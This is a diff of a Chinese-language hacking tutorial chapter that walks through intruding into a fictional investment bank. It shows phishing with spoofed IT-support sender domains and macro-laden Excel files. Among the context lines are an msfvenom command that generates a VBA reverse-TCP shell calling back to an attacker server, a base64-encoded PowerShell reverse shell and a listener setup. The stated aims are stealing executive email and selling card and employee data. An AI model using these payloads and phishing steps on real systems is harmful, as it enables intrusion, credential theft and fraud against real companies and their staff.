@@ -1,19 +1,18 @@
 ﻿# 第二章、入侵
 
-> 万物皆有裂缝，这就是光线进入的方式。” -- *伦纳德科恩（Leonard Cohen）*
+> 万物皆有裂缝，这就是光线进入的方式。 -- *伦纳德科恩（Leonard Cohen）*
 
 您找到了匿名免费接入互联网的完美地点，您已经设置了TOR / VPN网络，并且您有一个VPN充当前置堡垒。你感到颤抖，你准备好了！
 
 我们的（假）目标将是一家名为Slash＆Paul's Holding（后续简称SPH）的公司。它是一家投资银行，为世界上一些最富有的客户管理资产。他们并不是特别邪恶;他们碰巧有巨额资金。
 
 在启动我们的工具和技巧之前，先停一停，再次明确我们的（非）神圣目标：
->1.我们希望获得CEO的电子邮件，因为这只是一个常规操作！
-
->2.我们还想窃取和销售业务和人力资源数据：帐号，信用卡数据，员工信息等。
-
->3.但最重要的是，我们希望在雷达下自由翱翔。
++ 我们希望获得CEO的电子邮件，因为这只是一个常规操作！
++ 我们还想窃取和销售业务和人力资源数据：帐号，信用卡数据，员工信息等。
++ 但最重要的是，我们希望在各类监控手段下自由翱翔。
 
 SPH的基础设施以广泛而简单的方式看起来可能如下所示：
+
 ![SPH基础设施](./Chap2/SPH-Infrastructure.png)
 
 
@@ -31,7 +30,7 @@ SPH的基础设施以广泛而简单的方式看起来可能如下所示：
 -  攻击Bluebox中的公共服务器。更难，但效率更高。
 -  需要虚假USB棒，硬件植入等的社会工程的深奥形式。我们将把它留给真正有动力的黑客。
 
-## 2.1 把他们都钓起来
+## 2.1 钓鱼邮件
 
 网络钓鱼是诱骗用户以某种方式削弱公司安全性的行为：点击链接，泄露密码，下载看似无害的软件，将钱汇到某个帐户等等。
 
@@ -53,6 +52,7 @@ SPH的基础设施以广泛而简单的方式看起来可能如下所示：
 - 电子邮件的格式：例如，是'name.surname@company.com'还是'first_letter_surname.name@company.com'？
 
 访问网页 www.sph-assets.com/contact 时，我们会找到一个通用的联系地址：marketing@sph-assets.com。这本身并不是很有帮助，但只是发送电子邮件到这个地址将使我们得到在市场部门工作的真实人的回复。
+
 ![](./Chap2/2.Email.png)
 
 非常好，我们从这封电子邮件中获得了两条有价值的信息:
@@ -84,9 +84,11 @@ SPH的基础设施以广泛而简单的方式看起来可能如下所示：
 
 
 因此，在“发送配置文件”菜单中，我们需要指定另一个域名，例如 sph-group.com。发送电子邮件不需要存在此域名。不要费心去创造它。此外，只要我们提出别名：“IT支持”<it-support@sph-group.com>，人们通常不会关注电子邮件发件人。
+
 ![](./Chap2/3.SendingProfile.png)
 
 我们在“用户和群组”菜单中添加我们想要定位的用户，然后转到“电子邮件模板”以编写我们的消息内容：
+
 ![](./Chap2/4.MessageContent.png)
 
 
@@ -127,6 +129,7 @@ Visual Basic是一种脚本语言，可以嵌入到Office文档（Word，Excel�
 root@FrontGun:~# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -e generic/none -f vba lhost=FrontGun_IP  lport=443
 ```
 这将为x86架构生成反向shell攻击负载，无需任何特殊编码（通用/无）。我们将代码复制/粘贴到Excel宏中:
+
 ![](./Chap2/5.ExcelVBAPayload.png)
 
 如果我们检查生成的代码，我们知道它执行以下操作:
@@ -173,6 +176,7 @@ $client.Close()
 
 
 在Front Gun服务器上，我们在端口4444上设置了监听器:
+
 ![](./Chap2/6.Listener.png)
 
 漂亮！我们在远程（测试）机器上进行远程执行。理想情况下，我们希望使用类似的VBA代码来调用此脚本:
@@ -207,6 +211,7 @@ $client.Close();
 ```
 FrontGun$ cat reverse.ps1 | iconv -f UTF8 -t UTF16LE | base64
 ```
+
 ![](./Chap2/7.Encode.png)
 
 
@@ -214,6 +219,7 @@ FrontGun$ cat reverse.ps1 | iconv -f UTF8 -t UTF16LE | base64
 <br>
 
 我们可以使用编码命令作为inline参数来调用此代码:
+
 ![](./Chap2/8.InlineArg.png)
 
 
@@ -240,6 +246,7 @@ End Sub
 
 
 在欢迎屏幕上，转到监听器菜单（命令监听器）并列出默认位置info命令:
+
 ![](./Chap2/9.info.png)
 
 <br/>
